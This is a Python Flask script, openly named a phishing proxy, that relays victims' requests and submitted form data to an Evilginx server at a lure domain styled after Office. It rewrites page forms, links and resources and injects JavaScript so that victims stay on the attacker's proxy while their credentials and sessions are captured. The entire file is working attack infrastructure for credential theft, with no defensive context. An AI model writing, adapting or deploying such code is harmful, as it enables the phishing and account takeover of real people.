import uuid
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, session, Response

app = Flask(__name__)
app.secret_key = 'YOUR_SECRET_KEY'  # Needed to use Flask session

EVILGINX_HOST = "https://office.aqvfjfufcy.beconinc.org"  # Base URL for Evilginx (change as appropriate)

# In-memory store for sessions to Evilginx (maps session ID -> requests.Session)
evil_sessions = {}

# Catch-all route for /CJJlHmAY and any subpaths
@app.route('/CJJlHmAY', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/CJJlHmAY/<path:subpath>', methods=['GET', 'POST'])
def phishing_proxy(subpath):
    # 1. Maintain a persistent requests.Session for this client
    client_id = session.get('client_id')
    if not client_id:
        client_id = str(uuid.uuid4())
        session['client_id'] = client_id
    if client_id not in evil_sessions:
        evil_sessions[client_id] = requests.Session()
    sess = evil_sessions[client_id]

    # 2. Determine target path on Evilginx
    if request.method == 'POST':
        # For form submissions, get target from hidden field
        target_path = request.form.get('targetPath', '')
    else:
        # For GET requests, use the subpath or default to lure path
        target_path = '/' + subpath if subpath else '/CJJlHmAY'
    # Construct full Evilginx URL
    target_url = EVILGINX_HOST + target_path

    # 3. Forward the client’s request to Evilginx
    if request.method == 'GET':
        upstream_resp = sess.get(target_url, allow_redirects=False)
    else:  # POST
        # Forward form data (excluding our hidden field)
        form_data = request.form.to_dict()
        form_data.pop('targetPath', None)
        upstream_resp = sess.post(target_url, data=form_data, allow_redirects=False)

    # 4. Handle Evilginx redirects internally
    redirect_limit = 5
    while upstream_resp.is_redirect and redirect_limit > 0:
        loc = upstream_resp.headers.get('Location')
        if not loc:
            break
        # Build absolute URL for the redirect
        if loc.startswith('http'):
            next_url = loc
        else:
            next_url = EVILGINX_HOST + loc
        upstream_resp = sess.get(next_url, allow_redirects=False)
        redirect_limit -= 1

    # 5. If response is not HTML (e.g., image/css/js), stream it back directly
    content_type = upstream_resp.headers.get('Content-Type', '')
    if not content_type or "text/html" not in content_type.lower():
        # Filter hop-by-hop headers and status
        excluded_h = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        headers = [(h, v) for h, v in upstream_resp.headers.items() if h.lower() not in excluded_h]
        return Response(upstream_resp.content, status=upstream_resp.status_code, headers=headers)

    # 6. Process HTML content
    html = upstream_resp.text  # decode HTML content to text
    soup = BeautifulSoup(html, 'html.parser')

    # Insert base tag to ensure relative URLs resolve under /CJJlHmAY
    base_tag = soup.new_tag('base', href=request.host_url + 'CJJlHmAY/')
    soup.head.insert(0, base_tag)

    # Rewrite form actions to post back to our proxy
    for form in soup.find_all('form'):
        orig_action = form.get('action', '')
        form['action'] = ''  # empty action = submit to same URL
        if orig_action:
            hidden = soup.new_tag('input', type='hidden', name='targetPath', value=orig_action)
            form.insert(0, hidden)

    # Rewrite anchor tags to prevent direct navigation
    for a in soup.find_all('a', href=True):
        href = a['href']
        if href.startswith(('javascript:', '#')):
            continue  # leave in-page anchors or JS links as is
        if href.startswith('http'):
            if EVILGINX_HOST in href:
                # Convert full Evilginx URL to relative path
                href = href.replace(EVILGINX_HOST, '')  # now it starts with '/'
            else:
                # External link - open in new tab to avoid navigation in our tab
                a['target'] = '_blank'
                continue
        # Now href is relative to Evilginx domain
        if not href.startswith('/'):
            # Make sure it’s properly rooted (relative URLs without leading slash)
            href = '/' + href
        # Set up proxy click: use data-path and no actual href
        a['data-path'] = href  # store target path
        a['href'] = '#'        # neutralize original href

    # Rewrite other resource references (images, scripts, CSS) to proxy through our path
    for tag, attr in [('img', 'src'), ('script', 'src'), ('link', 'href')]:
        for node in soup.find_all(tag, **{attr: True}):
            url = node.get(attr)
            if url.startswith(('javascript:', 'data:')) or url == '':
                continue
            if url.startswith('http'):
                if EVILGINX_HOST in url:
                    url = url.replace(EVILGINX_HOST, '')  # to relative
                else:
                    # External resource (could also proxy if needed)
                    continue
            if not url.startswith('/'):
                url = '/' + url
            node[attr] = '/CJJlHmAY' + url  # prefix with our route

    # Inject JavaScript to handle dynamic navigation via fetch
    nav_script = """
    <script>
    function fetchPage(path) {
      fetch('/CJJlHmAY' + path, { credentials: 'same-origin' })
        .then(res => res.text())
        .then(html => {
          document.open();
          document.write(html);
          document.close();
        });
    }
    document.addEventListener('click', function(e) {
      const el = e.target;
      if (el.tagName === 'A' && el.dataset.path) {
        e.preventDefault();
        fetchPage(el.dataset.path);
      }
    });
    </script>
    """
    soup.body.append(BeautifulSoup(nav_script, 'html.parser'))

    # 7. Return the modified HTML to the browser
    return str(soup)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)